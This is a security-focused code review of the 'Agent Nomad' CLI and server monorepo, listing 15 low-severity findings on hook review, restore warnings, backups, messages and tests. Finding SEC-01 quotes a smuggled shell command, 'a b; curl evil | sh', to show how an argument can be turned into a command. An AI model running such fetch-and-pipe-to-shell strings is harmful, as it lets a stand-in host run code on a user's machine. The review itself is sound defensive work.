# Code Review — Agent Nomad — 2026-10-03 (review 6)

**Scope:** the whole repository at `dev` (`b8bb510`), after the fixes of review 5 (T75 to T79). Every tracked file except the lockfile, the Drizzle snapshots and images.

**Stack:** pnpm monorepo, TypeScript 6 (strict, ES modules, Node ≥ 22.13). Packages: `contracts` (Zod schemas), `core` (encryption, bundle format, paths, merge), `cli` (commander, @clack/prompts, libsodium, fflate, @napi-rs/keyring), `server` (Hono, Drizzle, Neon Postgres; PGlite in tests), `e2e`. Tests: Vitest. Judged against the project's own rules in `docs/ARCHITECTURE.md`, `CONTRIBUTING.md` and `docs/security/threat-model.md`.

**Coverage:** 257 of 257 files read in full, 37,514 lines. One reviewer, no agents.

**Checks run:**

| Check                                  | Result                                                                                              |
| -------------------------------------- | --------------------------------------------------------------------------------------------------- |
| Type check (`tsc --build`)             | pass                                                                                                |
| Lint (`eslint .`)                      | pass                                                                                                |
| Format (`prettier --check .`)          | pass                                                                                                |
| Tests (`vitest run`)                   | pass: 53 files, 1,355 passed, 16 skipped (run on `392a287`; the two later commits change docs only) |
| Dependency audit (`pnpm audit --prod`) | pass                                                                                                |
| Unused code (`pnpm knip`)              | pass                                                                                                |
| End to end (`pnpm test:e2e`)           | not run locally (CI runs it on every push)                                                          |
| Findings run for real                  | SEC-01 and UX-02 reproduced with a probe script against the real functions; QA-01 checked with `od` |

## Summary

The code is in very good health. All 57 findings of review 5 are fixed, and this pass found nothing Critical, High or Medium: 15 Low findings. Nothing lets the server, the network or another user read or change data, and the server, contracts, core and e2e packages have no finding in their source. The two findings worth doing first are both in the pull review: a hook that changes between "program plus arguments" and "one shell command" with the same text is not shown as changed (SEC-01), and file paths with a line break are still printed raw in restore warnings (SEC-02). One small real bug: two environment-value writes in the same second replace each other's profile backup (BUG-01). The rest is wording, tests that sit away from their code, copied test helpers and docs that are a step behind the code.

## Scores

| Area                         | Score /10 | One-line reason                                                              |
| ---------------------------- | --------- | ---------------------------------------------------------------------------- |
| Correctness                  | 9         | Two Low bugs, both in rare paths                                             |
| Security                     | 9         | Two Low gaps, both need a forged setup made with the user's own key          |
| Performance                  | 9         | No finding; limits and paging everywhere                                     |
| User experience              | 8.5       | Three messages that say the wrong thing or warn without reason               |
| Readability                  | 8.5       | Docs slightly behind the code; many tests live in another module's test file |
| Maintainability              | 8.5       | Shared test fakes exist but are still copied in places                       |
| Architecture and scalability | 9         | Agent boundary holds; the lint rule misses four generic files                |
| Test coverage                | 9         | 1,355 tests; each finding below names the one missing test                   |

| Category        | Critical | High | Medium | Low |
| --------------- | -------- | ---- | ------ | --- |
| Bugs            | 0        | 0    | 0      | 2   |
| Security        | 0        | 0    | 0      | 2   |
| Database        | 0        | 0    | 0      | 0   |
| Performance     | 0        | 0    | 0      | 0   |
| User experience | 0        | 0    | 0      | 3   |
| Dead code       | 0        | 0    | 0      | 0   |
| Duplication     | 0        | 0    | 0      | 2   |
| Readability     | 0        | 0    | 0      | 3   |
| Refactoring     | 0        | 0    | 0      | 0   |
| Best practices  | 0        | 0    | 0      | 0   |
| System design   | 0        | 0    | 0      | 2   |
| SOLID and OOP   | 0        | 0    | 0      | 0   |
| QA and testing  | 0        | 0    | 0      | 1   |
| **Total**       | 0        | 0    | 0      | 15  |

## Fix first

1. **SEC-01** — a hook that changes form with the same text is not shown in the pull review.
2. **SEC-02** — restore warnings print file paths with line breaks as they are.
3. **BUG-01** — two profile backups in one second: the second replaces the first.
4. **UX-01** — the "partial pull" messages blame declined commands when the cause can be an unanswered file question.
5. **UX-02** — false "this hook is for another OS" warnings.
6. **BUG-02** — the weekly drift issue is edited and commented every week even when nothing changed.

## Findings

### Security

Both need a setup forged with the user's own data key (threat 13: one of the user's PCs is compromised and tries to spread through a pull).

#### SEC-01 · Low · A hook that changes between "program plus arguments" and "one shell command" is not shown as changed

- [ ] **Where:** `packages/cli/src/agents/claude-code/command-review.ts:110-112`
- **Problem:** A hook entry is shown and compared as `[command, ...args].join(' ')`. `{command: 'tool', args: ['a b; curl evil | sh']}` (one argument, no shell) and `{command: 'tool a b; curl evil | sh'}` (a shell command line) give the same text, so `reviewRunnable` returns nothing when a setup swaps one for the other. Reproduced with a probe against the real function: `[]` both ways.
- **Why it matters:** The exec form passes the text as data; the shell form runs it. A forged setup can turn a harmless argument already on this PC into a command, and `pull --yes` without `--allow-commands` accepts it unshown.
- **Fix:** Compare the exec form by a stable form of `{command, args}` (for example its JSON), and show each argument quoted so the two forms never print the same. Add a test for the swap in both directions.
- **Effort:** S
- **Confidence:** high (reproduced)

#### SEC-02 · Low · Restore warnings print file paths with line breaks as they are

- [ ] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:320`, `:339`, `:391`, `:403` (and the warning in `claude-json-merge.ts`); printed at `packages/cli/src/pull/pull-command.ts:516`; `packages/contracts/src/bundle.ts:60-64` allows `\n` in a path
- **Problem:** The restorer puts `file.path` into `report.warnings`; `reporter.warn` passes it through `printable()`, which keeps line breaks. A path with a line break can therefore print its own fake line under a warning. This is the rest of review 5's SEC-04, which fixed the other places.
- **Why it matters:** A forged setup can make the output show a reassuring or misleading line ("✔ Restored …") in the middle of the warnings.
- **Fix:** Build the warnings with the one-line form already used elsewhere for paths (the helper SEC-04 added), or have `warn` take the path separately. Add a restorer test with a path holding `\n`.
- **Effort:** S
- **Confidence:** high

### Bugs

#### BUG-01 · Low · Two profile backups in the same second: the second replaces the first

- [ ] **Where:** `packages/cli/src/env/shell-profile.ts:152-156`
- **Problem:** The backup name carries a time stamp to the second and is written with a plain `writeFile`. A pull that writes environment values for two setups (global and a project) within one second writes the second backup over the first. The first backup held the profile as it was before agentnomad touched it. The restorer already avoids this with `freeSuffix` (T45).
- **Why it matters:** The one copy of the user's original shell profile can be lost; it is the copy they would need if the block went wrong.
- **Fix:** Pick a free name the way the restorer does (share `freeSuffix` from one place), or write with the `wx` flag and add a counter. Add a test: two writes with the same clock leave two backups.
- **Effort:** S
- **Confidence:** high (by reading; macOS/Linux path, not run on this Windows PC)

#### BUG-02 · Low · The drift issue is edited and commented every week even when nothing changed

- [x] **Where:** `.github/workflows/drift-check.yml:118-141` (and `DRIFT_RUN_URL` at `:113`); `packages/cli/scripts/drift/drift.ts:193`
- **Problem:** The workflow says it updates the open issue "only when the report changes", and compares the new body with the old one. The body ends with the link to this week's run, so it always differs.
- **Why it matters:** An open drift issue gets a new edit and a "report updated" comment every week, which is exactly the noise the comparison was written to prevent.
- **Fix:** Compare the bodies without the run-link line, or keep the link out of the body and put it only in the comment. The drift test can check that two reports from the same input are equal.
- **Effort:** S
- **Confidence:** high (by reading; the workflow was not run)

### User experience

#### UX-01 · Low · The "partial pull" messages blame declined commands when the cause can be something else

- [ ] **Where:** `packages/cli/src/push/push-command.ts:343-352`; set at `packages/cli/src/pull/pull-command.ts:526-528`; stale comments in `packages/cli/src/state/local-state.ts:9`, `:29-31`, `:77`, `:84`; `docs/ARCHITECTURE.md:253-254`, `:533`
- **Problem:** Push's question, warning and skip reason all say the last pull "left out commands you declined" and advise `pull --allow-commands`. Since T46 a pull is also marked partial when a file question was left unanswered (kept files). For that case the advice does nothing.
- **Why it matters:** The user follows the advice, pulls again with `--allow-commands` (which accepts all new commands), and push still refuses.
- **Fix:** Say "the last pull here did not restore everything" and advise a plain `pull`; or store the reason in the partial note is not possible without changing `state.json`, so keep one wording that is true for both. Update the comments and the two doc lines. Add a push test for a partial note caused by a kept file.
- **Effort:** S
- **Confidence:** high

#### UX-02 · Low · False "this hook is for another OS" warnings

- [ ] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:121-126` (`hooksForOtherOs`)
- **Problem:** Every word of a hook command is tested against shell names. `echo "use bash here"` and `git log -1 --format="%s by sh"` warn on Windows; `notify "ran cmd"` warns on Linux. The warning also prints the words without their quotes. Reproduced with a probe.
- **Why it matters:** A warning that is often wrong teaches the user to ignore it, and the printed command is not the one in their settings.
- **Fix:** Test only the program word and words that end in a script extension; print the command as written. Add the three cases as tests.
- **Effort:** S
- **Confidence:** high (reproduced)

#### UX-03 · Low · Two plugin and managed-settings messages are less clear than their neighbours

- [ ] **Where:** `packages/cli/src/agents/claude-code/plugin-sync.ts:211-216`; `packages/cli/src/agents/claude-code/managed-settings.ts:174-177`
- **Problem:** A failed `marketplace add` prints the raw output; a failed plugin install next to it goes through `explainFailure`, which names the organization policy. For settings managed from the claude.ai admin console, the notice names the local cache file path beside the words "the claude.ai admin console".
- **Why it matters:** On a managed PC the user sees a raw CLI error for the marketplace and a file path they cannot edit.
- **Fix:** Pass the marketplace failure through `explainFailure`; for the remote source show only "the claude.ai admin console". One test each.
- **Effort:** S
- **Confidence:** high

### Duplication

#### DUP-01 · Low · The project settings file paths are written in four places

- [ ] **Where:** `packages/cli/src/agents/claude-code/restorer.ts:273`, `:413`; `packages/cli/src/agents/claude-code/project-collector.ts:111`; `packages/cli/src/agents/claude-code/env-files.ts` (`SETTINGS_FILES`)
- **Problem:** `.claude/settings.json` and `.claude/settings.local.json` are literals in each place.
- **Why it matters:** A new settings file name has to be added in four files; missing one means push and pull disagree.
- **Fix:** Export one list from `project-paths.ts` (or the data file) and use it in all four.
- **Effort:** S
- **Confidence:** high

#### DUP-02 · Low · Test helpers are still copied next to the shared fakes

- [ ] **Where:**
  - hand-made reporters: `packages/cli/test/env.test.ts:454-458`, `:476`, `:493`, `:507`, `:514-516`, `:575-579`, `:675-679`; `packages/cli/test/managed-settings.test.ts:213`, `:237`
  - `CollectedFile` literals: `env.test.ts:97-101`; `claude-code-after-restore.test.ts:255-259`, `:286-290`; `push-command.test.ts:454-458`
  - a fake `EnvWriter`, five times: `pull-command.test.ts:155-159`, `:783-790`; `agent-boundary.test.ts:220-224`, `:335-342`; `env.test.ts:430-441`
  - `read` / `readJson` / `exists` one-liners: `claude-code-restorer.test.ts:58-59`, `claude-code-adapter.test.ts:28-29` (and `:140-144`, `:172-173`), `pull-command.test.ts:67`, `agent-boundary.test.ts:56-60`
  - server: `account-routes.test.ts:33-47` (`pushGlobal`) repeats `bundle-routes.test.ts:49-65` (`put`); `limits-and-logs.test.ts:109`, `:123`, `:193` parse the register answer by hand
- **Problem:** `packages/cli/test/fakes.ts` and `packages/server/test/support/fixtures.ts` exist for this, but these copies stayed or were added since.
- **Why it matters:** A change to `Reporter`, `EnvWriter` or the PUT headers has to be made in each copy.
- **Fix:** Add `fakeReporter`, `collectedFile`, `fakeEnvWriter` and the file readers to `fakes.ts`, and a `putSetup` to `fixtures.ts`; use them.
- **Effort:** S
- **Confidence:** high

### Readability

#### READ-01 · Low · Four doc and comment spots are behind the code

- [x] **Where:** `SECURITY.md:50-52`; `docs/security/threat-model.md:3`, `:120`, `:127`; `docs/ARCHITECTURE.md:380-391`; `packages/server/src/storage/blob-store.ts:19-20`
- **Problem:** SECURITY.md lists the rate limits without the download limit (600 per account per hour, T77). The threat model header says "updated through T74", and row 44 (the download limit) sits under the heading "review 4, about threat 13", where it does not belong. ARCHITECTURE.md repeats the "Claude Code is running" text twice, the second copy garbled. The blob-store comment lists the outcomes without `over-limit`.
- **Why it matters:** These are the files users and contributors trust for what the server limits and why.
- **Fix:** Add the limit to SECURITY.md; set the header to "updated through T79" and move row 44 under its own "review 5" heading; remove the duplicated paragraph; add `over-limit` to the comment.
- **Effort:** S
- **Confidence:** high

#### READ-02 · Low · Many tests sit in another module's test file

- [ ] **Where:**
  - `settings-commands.ts` has no test file: its tests are in `claude-code-global-collector.test.ts:348-368`, `:484-497`, `claude-code-project-collector.test.ts:344-356` and `claude-code-command-review.test.ts:444-453`; `pathWords` has no direct test
  - the programs locator: `claude-code-global-collector.test.ts:500-608`
  - auto memory: `claude-code-project-collector.test.ts:242-342`
  - unknown files and notices: `claude-code-paths-data.test.ts:51-153`
  - restore rules and hook scripts: `claude-code-restorer.test.ts:147-279`, `:1046-1090` (the file is 1,090 lines)
  - `windowsNameProblem` (core): its reason texts are tested only in the CLI at `claude-code-restorer.test.ts:981-1004`; `packages/core/test/paths.test.ts:39-65` checks only that the text mentions Windows; `restore-rules.ts:38` re-exports it
  - `readFirstLine` in `no-terminal.test.ts:25-48`; `configDir` in `secret-store.test.ts:52-73`; `describeError` and `deviceNameOf` in `auth-commands.test.ts:683-700`; `formatSize` in `setup-commands.test.ts:259-265`
  - server: `limits-and-logs.test.ts:130-152`, `:225-258` and `hosting.test.ts` cover several modules each
  - `docs/ARCHITECTURE.md:611-612` says test files mirror source files
- **Problem:** A reader looking for the tests of a module does not find them by name. The `windowsNameProblem` part was asked for in review 5 (READ-04) and ticked without being moved.
- **Why it matters:** Coverage looks thinner than it is, new cases land wherever a file is open, and one test file is over a thousand lines.
- **Fix:** Add `claude-code-settings-commands.test.ts`, `claude-code-programs.test.ts`, `claude-code-auto-memory.test.ts`, `claude-code-restore-rules.test.ts` and move the blocks; move the `windowsNameProblem` texts to core's `paths.test.ts` and drop the re-export; move the small ones to their module's file. Add a direct `pathWords` test.
- **Effort:** M
- **Confidence:** high

#### READ-03 · Low · The help text writes "over 5 MB" by hand

- [ ] **Where:** `packages/cli/src/cli/program.ts:43`
- **Problem:** The limit is `MAX_BUNDLE_BYTES` in contracts; the help text repeats it as a literal (review 4 fixed the same thing on the server).
- **Fix:** Build the text from the constant.
- **Effort:** S
- **Confidence:** high

### System design

#### ARCH-01 · Low · The agent boundary lint rule does not cover the generic files in `agents/`

- [ ] **Where:** `eslint.config.js:64-66`, `:83`
- **Problem:** The rule stops `push/`, `pull/`, `cli/` and `env/` from importing an adapter's folder. `packages/cli/src/agents/adapter.ts`, `notices.ts`, `registry.ts` and `agents-command.ts` are generic too and are not in the rule's file list.
- **Why it matters:** An import of `./claude-code/…` in one of them would pass lint and quietly tie every agent to Claude Code. None does today.
- **Fix:** Add `packages/cli/src/agents/*.ts` to the rule's `files`.
- **Effort:** S
- **Confidence:** high

#### ARCH-02 · Low · The `--memory` help text repeats Claude Code's description in generic code

- [ ] **Where:** `packages/cli/src/cli/program.ts:176`
- **Problem:** "include memory (subagent and auto memory)" is Claude Code wording; the adapter already has `memoryDescription` for this.
- **Why it matters:** The second agent's memory is something else, and the two texts can drift.
- **Fix:** Say "include the agent's memory" in the help, and leave the detail to the adapter's question.
- **Effort:** S
- **Confidence:** high

### QA and testing

#### QA-01 · Low · Two tests hold look-alike characters as raw text

- [ ] **Where:** `packages/core/test/crypto.test.ts:72-73`; `packages/core/test/project-names.test.ts:61`
- **Problem:** The composed and decomposed forms of "café" are written as raw characters that look the same (checked with `od`: the bytes differ). Review 4 fixed the same pattern for a non-breaking space.
- **Why it matters:** An editor or formatter that normalises text makes both sides equal, and the test then checks nothing.
- **Fix:** Write them as `'café'` and `'café'`.
- **Effort:** S
- **Confidence:** high

## Standards to adopt

- **One identity for a thing that runs:** the review compares the structure of a hook (form, program, arguments), not its joined text (SEC-01).
- **Text from a setup is printed on one line:** every path or name that comes from a bundle goes through the one-line helper before it reaches the reporter (SEC-02).
- **Backups never replace a backup:** one shared "free name" helper for the restorer and the profile writer (BUG-01).
- **A module's tests live in the file named after it** (READ-02), and **test fakes come from `fakes.ts` / `fixtures.ts`** (DUP-02).
- **Limits and file names are constants, in messages too** (READ-03, DUP-01).
- **A fix that changes behaviour updates SECURITY.md, the threat model and ARCHITECTURE.md in the same task** (READ-01, UX-01).

## What will break first at scale

1. **Postgres round trips and the orphan sweep.** Every signed-in request costs a session lookup and most cost a rate-limit write; the orphan sweep filters `bundle_blobs.created_at`, which has no index. Fine today; the first ceiling on a small Neon database. Files: `packages/server/src/db/session-repository.ts`, `packages/server/src/rate-limit/postgres-rate-limiter.ts`, `packages/server/src/storage/postgres-blob-store.ts`.
2. **Memory on both sides.** The server holds a 5 MB upload in memory; the CLI reads a whole setup into memory on push and pull, and a setup cannot be split. Files: `packages/server/src/http/routes/bundles.ts`, `packages/cli/src/agents/shared/file-gathering.ts`, `packages/cli/src/pull/pull-command.ts`.
3. **The second agent and more contributors.** The generic files in `agents/` are outside the lint rule (ARCH-01), help text carries Claude Code wording (ARCH-02), and the test suite is hard to navigate (READ-02, DUP-02).

## Suggested order of work

1. **Pull review and restorer: SEC-01, SEC-02, UX-02, DUP-01.** Same files (`command-review.ts`, `restorer.ts`).
2. **CLI behaviour and wording: BUG-01, UX-01, UX-03, READ-03, ARCH-02, ARCH-01.** Small, independent.
3. **Tests: DUP-02 first, then READ-02, QA-01.** Shared helpers first, so moved tests use them.
4. **CI and docs: BUG-02, READ-01.**

## Not reviewed

- Skipped by rule, 16 files: `pnpm-lock.yaml`, the 7 Drizzle snapshots in `packages/server/drizzle/meta/`, and 8 images.
- Git-ignored files (`packages/server/.env`, `node_modules`, build output, `coverage/`).
- Not run: `pnpm test:e2e` locally, and anything against the production database or the hosted API.
- BUG-01 and BUG-02 were confirmed by reading, not by running (a macOS/Linux path and a GitHub workflow).
- Cryptography was checked for correct use of libsodium; it is not a formal audit.
- Noted, no finding: the Render build command of review 5's PERF-03 was proven only in a fresh clone, not on Render; it runs for the first time on the next deploy from `main`.
